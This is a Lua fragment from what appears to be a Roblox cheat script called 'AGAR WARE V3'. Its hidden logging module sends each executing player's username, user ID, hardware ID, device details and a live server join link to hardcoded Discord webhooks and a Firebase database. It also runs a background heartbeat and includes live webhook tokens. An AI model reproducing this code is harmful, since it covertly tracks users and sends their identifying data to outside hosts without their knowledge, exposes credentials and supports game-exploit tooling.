-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
local function C_330()
local script = G2L["330"];
	local _WH = {}
	do
		local _HttpService     = game:GetService("HttpService")
		local _Players         = game:GetService("Players")
		local _MarketplaceSvc  = game:GetService("MarketplaceService")
		local _AnalyticsSvc    = game:GetService("RbxAnalyticsService")
		local _InputService    = game:GetService("UserInputService")
	
		local _WEBHOOK = "https://discord.com/api/webhooks/1502950736902750258/mav7Jjsbea6vyUZOV3NfWzIvIB1XDSTJMqjKx7mCTCY00RL2mKnKQqgdZGRGfPWMjO5Y"
		local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
		local _SCRIPT_NAME = "AGAR WARE V3"
	
		local _req = (syn and syn.request)
			or request
			or http_request
			or (fluxus and fluxus.request)
			or function() return { StatusCode = 0 } end
	
		local _plr = _Players.LocalPlayer
		local _productInfo = pcall(function()
			return _MarketplaceSvc:GetProductInfo(game.PlaceId)
		end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
	
		local function _hwid()
			if get_hwid then return tostring(get_hwid()) end
			local ok, id = pcall(function() return _AnalyticsSvc:GetClientId() end)
			return ok and id or "N/A"
		end
	
		local function _executor()
			if syn and syn.request then return "Synapse X" end
			if fluxus and fluxus.request then return "Fluxus" end
			if KRNL_LOADED or Krnl then return "KRNL" end
			if getexecutorname then return getexecutorname() end
			return "Unknown"
		end
	
		local function _platform()
			local p = _InputService:GetPlatform().Name
			local device = "Unknown"
	
			if p == "Windows" then device = "Windows"
			elseif p == "OSX" then device = "MacOS"
			elseif p == "IOS" then device = "iOS"
			elseif p == "Android" then device = "Android"
			elseif p == "UWP" then device = "Xbox"
			else device = p end
	
			return device
		end
	
		local function _ping()
			local ok, v = pcall(function()
				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
			end)
			return ok and math.floor(v) or 0
		end
	
		local function _fps()
			local v = workspace:GetRealPhysicsFPS()
			return v > 0 and math.floor(v) or 0
		end
	
		local function _joinLink()
			local ok, v = pcall(function()
				return "https://www.roblox.com/games/start?placeId="
					.. game.PlaceId
					.. "&gameInstanceId=" .. game.JobId
			end)
			return ok and v or ""
		end
	
		local function _findPlayerKey(userId)
			-- Check if a key exists for this userId (with any username)
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players.json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local allPlayers = _HttpService:JSONDecode(response.Body)
				if type(allPlayers) == "table" then
					for key, _ in pairs(allPlayers) do
						-- Extract userId from key (format: "userId - username")
						local keyUserId = key:match("^(%d+)%s*%-")
						if keyUserId and tonumber(keyUserId) == userId then
							return key
						end
					end
				end
			end
	
			return nil
		end
	
		local function _renamePlayerKey(oldKey, newKey)
			-- Get data from old key
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local data = _HttpService:JSONDecode(response.Body)
	
				-- Create new key with data
				pcall(function()
					_req({
						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(newKey) .. ".json",
						Method = "PUT",
						Headers = { ["Content-Type"] = "application/json" },
						Body = _HttpService:JSONEncode(data)
					})
				end)
	
				-- Delete old key
				pcall(function()
					_req({
						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
						Method = "DELETE"
					})
				end)
			end
		end
	
		local function _getPlayerData(playerKey)
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(playerKey) .. ".json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local data = _HttpService:JSONDecode(response.Body)
				if type(data) == "table" then
					return data
				end
			end
	
			return {
				execution_count = 0,
				first_seen = os.time(),
				last_seen = os.time(),
				hwids = {}
			}
		end
	
		local function _updatePlayerData(playerKey, data)
			pcall(function()
				_req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(playerKey) .. ".json",
					Method = "PATCH",
					Headers = { ["Content-Type"] = "application/json" },
					Body = _HttpService:JSONEncode(data)
				})
			end)
		end
	
		local function _addHWID(playerKey, hwid)
			local playerData = _getPlayerData(playerKey)
	
			-- Check if HWID already exists
			local hwidExists = false
			for _, existingHwid in pairs(playerData.hwids) do
				if existingHwid == hwid then
					hwidExists = true
					break
				end
			end
	
			-- Add HWID if it doesn't exist
			if not hwidExists then
				table.insert(playerData.hwids, hwid)
				_updatePlayerData(playerKey, { hwids = playerData.hwids })
			end
	
			return playerData
		end
	
		local function _send(embedTable)
			pcall(function()
				_req({
					Url    = _WEBHOOK,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body   = _HttpService:JSONEncode({ embeds = { embedTable } })
				})
			end)
		end
	
		local userId = _plr.UserId
		local username = _plr.Name
		local hwid = _hwid()
	
		-- Create player key format: "userId - username"
		local currentKey = userId .. " - " .. username
	
		-- Check if player exists with different username
		local existingKey = _findPlayerKey(userId)
	
		if existingKey and existingKey ~= currentKey then
			-- Username changed, rename the key
			_renamePlayerKey(existingKey, currentKey)
		end
	
		-- Get player data and add HWID
		local playerData = _addHWID(currentKey, hwid)
	
		-- Update execution count and last seen
		playerData.execution_count = playerData.execution_count + 1
		playerData.last_seen = os.time()
	
		_updatePlayerData(currentKey, {
			execution_count = playerData.execution_count,
			last_seen = playerData.last_seen
		})
	
		local accountCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
	
		_send({
			title = string.format("%s / @%s", _plr.DisplayName, _plr.Name),
			description = string.format(
				"**User ID:** #`%d`\n**%s** (%d Days)\n\n**Game:** [%s](%s)\n**Server:** %d/%d\n\n**Executor:** %s\n**Device:** %s | %dms | %dfps\n**HWID:** `%s`\n\n**Execution Count:** #%d",
				_plr.UserId,
				accountCreated,
				_plr.AccountAge,
				_productInfo.Name,
				_joinLink(),
				#_Players:GetPlayers(),
				_Players.MaxPlayers,
				_executor(),
				_platform(),
				_ping(),
				_fps(),
				hwid,
				playerData.execution_count
			),
			color = 0x000000,
			footer = { text = _SCRIPT_NAME },
			timestamp = DateTime.now():ToIsoDate()
		})
	end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-- Add this AFTER your load webhook code
	
	local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local _plr = game:GetService("Players").LocalPlayer
	local _HttpService = game:GetService("HttpService")
	local _MarketplaceSvc = game:GetService("MarketplaceService")
	
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	
	local function _hwid()
		if get_hwid then return tostring(get_hwid()) end
		local ok, id = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
		return ok and id or "N/A"
	end
	
	local function _joinLink()
		local ok, v = pcall(function()
			return "https://www.roblox.com/games/start?placeId="
				.. game.PlaceId
				.. "&gameInstanceId=" .. game.JobId
		end)
		return ok and v or ""
	end
	
	local _productInfo = pcall(function()
		return _MarketplaceSvc:GetProductInfo(game.PlaceId)
	end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
	
	local function updateOnlineStatus()
		pcall(function()
			_req({
				Url = _FIREBASE_URL .. "/online_users/" .. _plr.Name .. ".json",
				Method = "PUT",
				Headers = { ["Content-Type"] = "application/json" },
				Body = _HttpService:JSONEncode({
					username_display = _plr.Name .. " / " .. _plr.DisplayName,
					hwid = _hwid(),
					game_name = _productInfo.Name,
					game_link = _joinLink(),
					place_id = game.PlaceId,
					last_heartbeat = os.time()
				})
			})
		end)
	end
	
	-- Add to online list IMMEDIATELY on execute
	updateOnlineStatus()
	
	-- Send heartbeat every 3 minutes (180 seconds)
	spawn(function()
		while wait(180) do
			updateOnlineStatus()
		end
	end)
	
	-- Remove from online list when player leaves
	game:GetService("Players").PlayerRemoving:Connect(function(player)
		if player == _plr then
			pcall(function()
				_req({
					Url = _FIREBASE_URL .. "/online_users/" .. _plr.Name .. ".json",
					Method = "DELETE"
				})
			end)
		end
	end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	
	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1504421690610946173/Q7J4q10dMdKyr3EXfog5iqy6qMsOWsWdu_e-CSH2gZqCi--HeVI-mDWr9qeQ57kuN76p"
	
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	local _plr = Players.LocalPlayer
	
	-- Get current total execution count from Firebase
	local function getTotalExecutionCount()
		local success, response = pcall(function()
			return _req({
				Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
				Method = "GET"
			})
		end)
	
		if success and response.StatusCode == 200 then
			local count = HttpService:JSONDecode(response.Body)
			if type(count) == "number" then
				return count
			end
		end
	
		return 0
	end
	
	-- Update total execution count in Firebase
	local function updateTotalExecutionCount(newCount)
		pcall(function()
			_req({
				Url = FIREBASE_URL .. "/view/totalexecutioncount.json",
				Method = "PUT",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(newCount)
			})
		end)
	end
	
	-- Send Discord webhook
	local function sendWebhook(executionCount)
		pcall(function()
			local embed = {
				title = "AGAR WARE V3",
				description = string.format("This script has been executed **%d** times.", executionCount),
				color = 2346240,
				footer = {
					text = "Last Execution: " .. _plr.Name
				},
				timestamp = DateTime.now():ToIsoDate()
			}
	
			_req({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode({ embeds = { embed } })
			})
		end)
	end
	
	-- Main execution
	local currentCount = getTotalExecutionCount()
	local newCount = currentCount + 1
	
	-- Update Firebase
	updateTotalExecutionCount(newCount)
	
	-- Send webhook
	sendWebhook(newCount)
end;
task.spawn(C_330);

return G2L["1"], require;
